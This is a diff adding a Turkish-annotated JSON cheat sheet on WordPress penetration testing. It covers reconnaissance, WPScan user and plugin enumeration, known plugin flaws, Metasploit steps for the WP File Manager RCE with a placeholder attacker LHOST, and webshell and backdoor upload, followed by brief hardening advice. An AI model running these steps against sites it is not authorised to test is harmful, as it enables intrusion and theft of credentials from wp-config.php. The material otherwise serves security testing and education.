@@ -1,0 +1,228 @@
+{
+  "wordpress_security": {
+    "definition": {
+      "name": "WordPress",
+      "type": "Content Management System (CMS)",
+      "language": "PHP",
+      "database": "MySQL",
+      "description": "Dünya çapında yaygın kullanılan içerik yönetim sistemi"
+    },
+    "reconnaissance": {
+      "cms_detection": {
+        "methods": [
+          {
+            "name": "Manual Source Code Analysis",
+            "description": "Sayfa kaynak kodunu inceleyerek CMS tespiti",
+            "indicators": [
+              "<meta name=\"generator\" content=\"WordPress\" />",
+              "/wp-content/",
+              "/wp-includes/",
+              "/wp-admin/"
+            ]
+          },
+          {
+            "name": "Browser Extensions",
+            "tools": ["Wappalyzer", "BuiltWith"],
+            "description": "Tarayıcı eklentileri ile otomatik tespit"
+          },
+          {
+            "name": "Nmap Scripts",
+            "command": "nmap --script http-wordpress-* <target>",
+            "description": "Nmap ile WordPress tespit scriptleri"
+          }
+        ]
+      },
+      "important_files": {
+        "information_disclosure": [
+          "/readme.html",
+          "/license.txt",
+          "/wp-config.php",
+          "/wp-config.php.bak"
+        ],
+        "admin_panels": [
+          "/wp-admin/login.php",
+          "/wp-admin/wp-login.php",
+          "/login.php",
+          "/wp-login.php"
+        ],
+        "directories": [
+          "/wp-content/",
+          "/wp-includes/",
+          "/wp-admin/",
+          "/wp-content/plugins/",
+          "/wp-content/themes/",
+          "/wp-content/uploads/"
+        ]
+      }
+    },
+    "vulnerability_scanning": {
+      "wpscan": {
+        "description": "WordPress güvenlik tarama aracı",
+        "basic_usage": "wpscan --url <target>",
+        "parameters": {
+          "--url": "Taranacak hedef URL",
+          "--help": "Yardım menüsü",
+          "--output": "Çıktı dosyası belirtme",
+          "--detection-mode": "mixed, passive, aggressive",
+          "--max-threads": "Eş zamanlı thread sayısı",
+          "--wp-content-dir": "wp-content dizin yolu",
+          "--wp-plugins-dir": "wp-plugins dizin yolu"
+        },
+        "enumeration_options": {
+          "--enumerate": {
+            "vp": "Zafiyetli eklentiler",
+            "ap": "Tüm eklentiler",
+            "p": "Popüler eklentiler",
+            "vt": "Zafiyetli temalar",
+            "at": "Tüm temalar",
+            "t": "Popüler temalar",
+            "u": "Kullanıcılar",
+            "m": "Medya dosyaları"
+          }
+        },
+        "detection_modes": {
+          "mixed": "Hem pasif hem aktif tespit",
+          "passive": "Sadece pasif tespit",
+          "aggressive": "Agresif tespit (daha fazla istek)"
+        },
+        "common_commands": [
+          "wpscan --url <target> --enumerate p",
+          "wpscan --url <target> --enumerate u",
+          "wpscan --url <target> --enumerate vp,vt",
+          "wpscan --url <target> --plugins-detection aggressive"
+        ]
+      }
+    },
+    "common_vulnerabilities": {
+      "plugin_vulnerabilities": {
+        "wp-file-manager": {
+          "versions_affected": "< 6.9",
+          "vulnerability_type": "Remote Code Execution (RCE)",
+          "cve": "CVE-2020-25213",
+          "description": "Dosya yükleme zafiyeti"
+        },
+        "elementor": {
+          "vulnerability_type": "Privilege Escalation",
+          "description": "Yetki yükseltme zafiyeti"
+        },
+        "slider-revolution": {
+          "vulnerability_type": "Arbitrary File Download",
+          "description": "Keyfi dosya indirme zafiyeti"
+        }
+      },
+      "theme_vulnerabilities": {
+        "description": "Tema tabanlı güvenlik açıkları",
+        "common_issues": [
+          "SQL Injection",
+          "Cross-Site Scripting (XSS)",
+          "Local File Inclusion (LFI)"
+        ]
+      },
+      "core_vulnerabilities": {
+        "description": "WordPress çekirdek zafiyetleri",
+        "common_issues": [
+          "Authentication bypass",
+          "Privilege escalation",
+          "Remote code execution"
+        ]
+      }
+    },
+    "exploitation_methods": {
+      "metasploit_modules": {
+        "wp_file_manager_rce": {
+          "path": "exploit/multi/http/wp_file_manager_rce",
+          "description": "WP File Manager RCE exploiti",
+          "required_options": ["RHOSTS", "LHOST"],
+          "usage": [
+            "use exploit/multi/http/wp_file_manager_rce",
+            "set RHOSTS <target>",
+            "set LHOST <attacker_ip>",
+            "exploit"
+          ]
+        },
+        "wp_admin_shell_upload": {
+          "path": "exploit/unix/webapp/wp_admin_shell_upload",
+          "description": "WordPress admin shell upload"
+        }
+      },
+      "manual_exploitation": {
+        "file_upload": {
+          "description": "Zararlı dosya yükleme",
+          "techniques": [
+            "PHP backdoor upload",
+            "Webshell deployment",
+            "Plugin backdoor installation"
+          ]
+        },
+        "sql_injection": {
+          "description": "Veritabanı saldırıları",
+          "tools": ["sqlmap", "manual injection"]
+        }
+      }
+    },
+    "post_exploitation": {
+      "privilege_escalation": {
+        "wordpress_specific": [
+          "wp-config.php credentials",
+          "Database access",
+          "File system permissions"
+        ]
+      },
+      "data_extraction": {
+        "sensitive_files": [
+          "wp-config.php",
+          "database dumps",
+          "upload directories",
+          "log files"
+        ]
+      }
+    },
+    "security_hardening": {
+      "best_practices": [
+        "Regular updates",
+        "Strong passwords",
+        "Two-factor authentication",
+        "File permissions",
+        "Security plugins",
+        "Regular backups"
+      ],
+      "security_plugins": [
+        "Wordfence",
+        "Sucuri Security",
+        "iThemes Security",
+        "All In One WP Security"
+      ]
+    },
+    "tools": {
+      "scanners": [
+        {
+          "name": "WPScan",
+          "type": "WordPress-specific scanner"
+        },
+        {
+          "name": "Nikto",
+          "type": "Web vulnerability scanner"
+        },
+        {
+          "name": "Nmap",
+          "type": "Network scanner with WordPress scripts"
+        }
+      ],
+      "exploitation": [
+        {
+          "name": "Metasploit Framework",
+          "type": "Exploitation framework"
+        },
+        {
+          "name": "WPForce",
+          "type": "WordPress brute force tool"
+        }
+      ]
+    },
+    "references": {
+      "wpscan_db": "https://wpscan.com/wordpresses",
+      "wordpress_security": "https://wordpress.org/support/article/hardening-wordpress/",
+      "exploit_db": "https://www.exploit-db.com/"
+    }
+  }
+}
